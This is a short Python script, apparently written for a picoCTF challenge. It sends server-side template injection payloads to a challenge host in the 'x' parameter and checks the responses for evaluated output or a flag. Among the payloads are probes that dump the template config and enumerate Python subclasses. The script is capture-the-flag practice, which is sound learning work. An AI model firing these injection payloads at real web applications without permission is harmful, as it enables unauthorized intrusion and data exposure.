import requests
base = 'http://wily-courier.picoctf.net:49463'

# Test SSTI in x parameter
payloads = ['{{7*7}}', '${7*7}', '<%=7*7%>', '{{config}}', '{{''.__class__.__mro__[2].__subclasses__()}}']
for p in payloads:
    r = requests.get(base, params={'x': p})
    print(f'Payload: {p}')
    print(f'Length: {len(r.text)}')
    if str(7*7) in r.text or '49' in r.text:
        print('SSTI CONFIRMED!', r.text[:500])
    if 'picoCTF' in r.text or 'flag' in r.text.lower():
        print('FLAG:', r.text)
    print()